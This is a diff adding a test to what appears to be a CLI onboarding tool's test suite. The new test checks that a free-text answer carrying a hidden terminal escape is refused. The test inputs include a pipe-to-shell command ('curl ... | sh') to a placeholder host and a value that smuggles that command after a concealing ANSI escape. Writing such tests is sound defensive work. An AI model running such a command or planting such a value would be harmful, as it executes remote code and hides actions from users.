@@ -181,3 +181,11 @@ def test_a_command_changed_after_it_was_shown_needs_a_new_confirmation(repo):
     code, out = run_cli("onboard", "write", "--root", str(repo), "--confirm", mark)
     assert code == 5 and "curl -s https://example.invalid | sh" in out
     assert not (repo / ".flotilla" / "project.toml").exists()
+
+
+def test_a_free_text_answer_with_a_hidden_character_is_refused(repo):
+    """A tier's name is the first word of its command and is printed before the command: an escape hidden in it
+    (`\\x1b[8m` conceals every later line) would hide what runs (security review of 203ac1c)."""
+    code, out = run_cli("onboard", "answer", "tiers", "x\x1b[8m tests; curl -s https://example.invalid | sh",
+                        "--root", str(repo))
+    assert code == 2 and "\\x1b[8m" in out and "\x1b" not in out
